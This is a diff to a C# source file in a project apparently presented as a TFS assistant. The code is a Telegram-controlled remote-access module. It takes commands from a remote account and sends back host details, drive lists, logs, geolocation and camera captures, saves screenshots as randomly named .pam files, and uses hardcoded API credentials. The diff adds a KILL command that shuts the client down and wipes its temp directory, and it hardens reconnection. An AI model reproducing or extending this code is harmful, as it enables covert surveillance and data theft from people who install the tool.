@@ -28,6 +28,7 @@ namespace TFSAssist
     {
         PING,
         COMMANDS,
+        KILL,
         INFO,
         LOG,
         DRIVE,
@@ -110,42 +111,35 @@ namespace TFSAssist
 
             InitCamCapture(TempDirectory); // только после InitTempDirectory
 
-            tryConnect:
-            try
+            await Connect(GetAuthUserCode);
+
+            if (IsEnabled)
             {
-                await Connect(GetAuthUserCode);
+                await Task.Delay(5000);
+                SendMessageToUserHost($"Connected. {GetCurrentServerInfo()}");
+                await Task.Delay(1000);
             }
-            catch (SocketException ex)
-            {
-                // если нет соединения с интернетом, пытаемся реконнектиться
-                if (ex.SocketErrorCode == SocketError.HostUnreachable || ex.SocketErrorCode == SocketError.TimedOut)
-                {
-                    await Task.Delay(60000);
-                    goto tryConnect;
-                }
-            }
-            
+
             return IsEnabled;
         }
 
         async Task Connect(Func<Task<string>> getAuthUserCode)
         {
+            tryConnect:
+
             try
             {
                 IsEnabled = false;
+
+                _control?.Dispose();
                 _control = new TTLControl(770122, "8bf0b952100c9b22fd92499fc329c27e");
                 await _control.ConnectAsync();
+
                 IsEnabled = true;
-
-                await Task.Delay(5000);
-
-                SendMessageToCurrentUser($"Connected. {GetCurrentServerInfo()}");
-
-                await Task.Delay(1000);
             }
-            catch (AuthorizeException ex)
+            catch (AuthorizationException ex)
             {
-                if (getAuthUserCode != null)
+                if (getAuthUserCode != null && _control != null)
                 {
                     try
                     {
@@ -161,76 +155,36 @@ namespace TFSAssist
 
                 WriteExLog(ex, false);
             }
+            catch (SocketException ex)
+            {
+                // если нет соединения с интернетом, пытаемся реконнектиться
+                if (ex.SocketErrorCode == SocketError.HostUnreachable || ex.SocketErrorCode == SocketError.TimedOut)
+                {
+                    await Task.Delay(60000);
+                    goto tryConnect;
+                }
+            }
             catch (Exception)
             {
                 throw;
             }
         }
 
-        //public async Task EndTransaction()
-        //{
-        //    await SendMessageToCurrentUser($"Disconnected. {GetCurrentServerInfo()}");
-        //}
-
-        private readonly object sendContent = new object();
-
-        void SendMessageToCurrentUser(string message)
-        {
-            if (IsEnabled)
-            {
-                try
-                {
-                    //await _control.SendMessageAsync(_control.CurrentUser.Destination, $"CID=[{ClientID}]\r\n{message.Trim()}", 0);
-                    lock (sendContent)
-                    {
-                        Task task = _control.SendMessageAsync(_control.CurrentUser.Destination, $"CID=[{ClientID}]\r\n{message.Trim()}", 0);
-                        task.Wait();
-                    }
-                }
-                catch (Exception ex)
-                {
-                    WriteExLog(ex);
-                }
-            }
-        }
-
-        void SendBigFileToCurrentUser(string destinationPath)
-        {
-            if (IsEnabled)
-            {
-                try
-                {
-                    //await _control.SendBigFileAsync(_control.CurrentUser.Destination, destinationPath);
-                    lock (sendContent)
-                    {
-                        Task task = _control.SendBigFileAsync(_control.CurrentUser.Destination, destinationPath);
-                        task.Wait(); // таймаут ставить нельзя т.к. может интеренет тормознутый и надо дождаться до конца
-                    }
-
-                    // очищаем память, т.к. отправляем большой файл
-                    GC.Collect();
-                }
-                catch (Exception ex)
-                {
-                    WriteExLog(ex);
-                }
-            }
-        }
-
-        
+        private readonly object syncSession = new object();
 
         public async Task Run()
         {
             DateTime lastDate = DateTime.Now;
+
             while (IsEnabled)
             {
                 try
                 {
                     //List<TLMessage> newMessages = await _control.GetDifference(_control.CurrentUser.User, _control.CurrentUser.Destination, lastDate);
                     List<TLMessage> newMessages = null;
-                    lock (sendContent)
+                    lock (syncSession)
                     {
-                        Task<List<TLMessage>> task = _control.GetDifference(_control.CurrentUser.User, _control.CurrentUser.Destination, lastDate);
+                        Task<List<TLMessage>> task = _control.GetDifference(_control.UserHost.User, _control.UserHost.Destination, lastDate);
                         task.Wait();
 
                         newMessages = task.Result;
@@ -245,10 +199,67 @@ namespace TFSAssist
                 }
                 catch (Exception ex)
                 {
-                    WriteExLog(ex);
+                    bool isReconnected = false;
+                    lock (syncSession)
+                    {
+                        if (!_control.IsConnected)
+                        {
+                            Task task = Connect(GetAuthUserCode);
+                            task.Wait();
+                            isReconnected = true;
+                        }
+                    }
+
+                    if (isReconnected)
+                        SendMessageToUserHost($"Reconnected. {GetCurrentServerInfo()}");
+                    else
+                        WriteExLog(ex);
                 }
 
                 await Task.Delay(5000);
+            }
+        }
+
+        void SendMessageToUserHost(string message)
+        {
+            if (!IsEnabled)
+                return;
+
+            try
+            {
+                //await _control.SendMessageAsync(_control.CurrentUser.Destination, $"CID=[{ClientID}]\r\n{message.Trim()}", 0);
+                lock (syncSession)
+                {
+                    Task task = _control.SendMessageAsync(_control.UserHost.Destination, $"CID=[{ClientID}]\r\n{message.Trim()}", 0);
+                    task.Wait();
+                }
+            }
+            catch (Exception ex)
+            {
+                WriteExLog(ex);
+            }
+        }
+
+        void SendBigFileToCurrentUser(string destinationPath)
+        {
+            if (!IsEnabled)
+                return;
+
+            try
+            {
+                //await _control.SendBigFileAsync(_control.CurrentUser.Destination, destinationPath);
+                lock (syncSession)
+                {
+                    Task task = _control.SendBigFileAsync(_control.UserHost.Destination, destinationPath);
+                    task.Wait(); // таймаут ставить нельзя т.к. может интеренет тормознутый и надо дождаться до конца
+                }
+
+                // очищаем память, т.к. отправляем большой файл
+                GC.Collect();
+            }
+            catch (Exception ex)
+            {
+                WriteExLog(ex);
             }
         }
 
@@ -281,14 +292,17 @@ namespace TFSAssist
                         switch (command)
                         {
                             case RemoteControlCommands.PING:
-                                SendMessageToCurrentUser(GetCurrentServerInfo(true));
+
+                                SendMessageToUserHost(GetCurrentServerInfo(true));
                                 break;
 
                             case RemoteControlCommands.COMMANDS:
-                                SendMessageToCurrentUser(string.Join("\r\n", Enum.GetNames(typeof(RemoteControlCommands))));
+
+                                SendMessageToUserHost(string.Join("\r\n", Enum.GetNames(typeof(RemoteControlCommands))));
                                 break;
 
                             case RemoteControlCommands.INFO:
+
                                 var res = WIN32.GetDetailedHostInfo();
                                 if (res?.Count > 0)
                                 {
@@ -318,15 +332,16 @@ namespace TFSAssist
                                 break;
 
                             case RemoteControlCommands.LOG:
+
                                 string logs = GetProcessingLogs();
                                 if (logs.IsNullOrEmptyTrim())
                                 {
-                                    SendMessageToCurrentUser("Log is empty.");
+                                    SendMessageToUserHost("Log is empty.");
                                     break;
                                 }
                                 else if (logs.Length <= 500) // если логов немного
                                 {
-                                    SendMessageToCurrentUser(logs);
+                                    SendMessageToUserHost(logs);
                                     break;
                                 }
 
@@ -335,6 +350,7 @@ namespace TFSAssist
                                 break;
 
                             case RemoteControlCommands.DRIVE:
+
                                 var drives = DriveInfo.GetDrives();
                                 if (drives == null || drives.Length == 0)
                                     break;
@@ -348,10 +364,11 @@ namespace TFSAssist
                                     }
                                 }
 
-                                SendMessageToCurrentUser(result);
+                                SendMessageToUserHost(result);
                                 break;
 
                             case RemoteControlCommands.SCREEN:
+
                                 string imagePath = Path.Combine(projectDirPath, $"{STRING.RandomString(15)}.pam");
                                 await ScreenCapture.CaptureAsync(imagePath, ImageFormat.Png);
                                 break;
@@ -367,52 +384,62 @@ namespace TFSAssist
                                 var appCPUUsage = (int)SERVER.GetCpuUsage(proc);
                                 string appMemUsage = SERVER.GetMemUsage(proc).ToFileSize();
 
-                                SendMessageToCurrentUser($"CPU=[{appCPUUsage}%] Mem=[{appMemUsage}] TotalCPU=[{totalCPU}%] TotalMem=[{totalMem} MB] FreeMem=[{avalMem} MB]");
+                                SendMessageToUserHost($"CPU=[{appCPUUsage}%] Mem=[{appMemUsage}] TotalCPU=[{totalCPU}%] TotalMem=[{totalMem} MB] FreeMem=[{avalMem} MB]");
 
                                 break;
 
                             case RemoteControlCommands.RESTART:
+                                
                                 // TODO restart current app
                                 break;
 
                             case RemoteControlCommands.UPDATE:
+
                                 isUpdate = true;
                                 break;
 
                             case RemoteControlCommands.LOC:
+
                                 if (_locationResult.IsNullOrEmptyTrim())
                                 {
-                                    SendMessageToCurrentUser("Location unknown.");
+                                    SendMessageToUserHost("Location unknown.");
                                     _tryGetLocation = true;
                                 }
                                 else
                                 {
-                                    SendMessageToCurrentUser(_locationResult);
+                                    SendMessageToUserHost(_locationResult);
                                     _tryGetLocation = false;
                                 }
                                 break;
 
                             case RemoteControlCommands.CAMINFO:
+
+                                string currentDevices = string.Empty;
                                 string resultCamInfo = string.Empty;
                                 if (_aforgeDevices != null)
                                 {
+                                    if (_aforgeCapture != null)
+                                        currentDevices = $"AForge:\r\n{_aforgeCapture.ToString()}";
                                     resultCamInfo = _aforgeDevices.ToString();
                                 }
 
                                 if (_encDevices != null)
                                 {
-                                    resultCamInfo = resultCamInfo + "\r\n" + _encDevices.ToString();
+                                    if (_encoderCapture != null)
+                                        currentDevices = currentDevices + $"\r\nEncoder:\r\n{_encoderCapture.ToString()}";
+                                    resultCamInfo = resultCamInfo + "\r\n\r\n" + _encDevices.ToString();
                                 }
 
                                 resultCamInfo = resultCamInfo.Trim();
 
                                 if (resultCamInfo.IsNullOrEmptyTrim())
-                                    SendMessageToCurrentUser("No device found.");
+                                    SendMessageToUserHost("No device found.");
                                 else
-                                    SendMessageToCurrentUser(resultCamInfo);
+                                    SendMessageToUserHost(currentDevices.Trim() + "\r\n===================\r\n" + resultCamInfo);
                                 break;
 
                             case RemoteControlCommands.CAMSETT:
+
                                 int exceptionCount = 0;
                                 if (options != null && options.Count > 0)
                                 {
@@ -464,17 +491,18 @@ namespace TFSAssist
                                     }
 
                                     if(exceptionCount > 0)
-                                        SendMessageToCurrentUser($"Errors=[{exceptionCount}]");
+                                        SendMessageToUserHost($"Errors=[{exceptionCount}]");
                                     else
-                                        SendMessageToCurrentUser($"SUCCESS");
+                                        SendMessageToUserHost($"SUCCESS");
                                 }
 
                                 break;
 
                             case RemoteControlCommands.ACAM:
+
                                 if (_aforgeCapture == null)
                                 {
-                                    SendMessageToCurrentUser($"{nameof(AForgeCapture)} not initialized.");
+                                    SendMessageToUserHost($"{nameof(AForgeCapture)} not initialized.");
                                     break;
                                 }
 
@@ -483,9 +511,10 @@ namespace TFSAssist
                                 break;
 
                             case RemoteControlCommands.ECAM:
+
                                 if (_encoderCapture == null)
                                 {
-                                    SendMessageToCurrentUser($"{nameof(EncoderCapture)} not initialized.");
+                                    SendMessageToUserHost($"{nameof(EncoderCapture)} not initialized.");
                                     break;
                                 }
 
@@ -494,9 +523,10 @@ namespace TFSAssist
                                 break;
 
                             case RemoteControlCommands.PHOTO:
+
                                 if (_aforgeCapture == null)
                                 {
-                                    SendMessageToCurrentUser($"{nameof(AForgeCapture)} not initialized.");
+                                    SendMessageToUserHost($"{nameof(AForgeCapture)} not initialized.");
                                     break;
                                 }
 
@@ -508,15 +538,31 @@ namespace TFSAssist
                                 }
 
                                 break;
+
+                            case RemoteControlCommands.KILL:
+
+                                Terminate();
+
+                                break;
                         }
                     }
-                    else if (tl_message.Message.Like("ping"))
+                    else
                     {
-                        SendMessageToCurrentUser(GetCurrentServerInfo());
-                    }
-                    else if (tl_message.Message.Like("update"))
-                    {
-                        isUpdate = true;
+                        if (!AllCommands.TryGetValue(tl_message.Message, out var command))
+                            continue;
+
+                        switch (command)
+                        {
+                            case RemoteControlCommands.PING:
+                                SendMessageToUserHost(GetCurrentServerInfo());
+                                break;
+                            case RemoteControlCommands.UPDATE:
+                                isUpdate = true;
+                                break;
+                            case RemoteControlCommands.KILL:
+                                Terminate();
+                                break;
+                        }
                     }
                 }
             }
@@ -720,7 +766,7 @@ namespace TFSAssist
 
             if (_tryGetLocation)
             {
-                SendMessageToCurrentUser(_locationResult);
+                SendMessageToUserHost(_locationResult);
                 _tryGetLocation = false;
             }
         }
@@ -964,12 +1010,22 @@ namespace TFSAssist
 
         #endregion
 
+
+
         public void Dispose()
+        {
+            Terminate();
+        }
+
+        void Terminate()
         {
             try
             {
                 IsEnabled = false;
-                _control?.Dispose();
+                lock (syncSession)
+                {
+                    _control?.Dispose();
+                }
                 _watcher?.Stop();
                 DeleteAllFilesInDirectory(TempDirectory);
             }
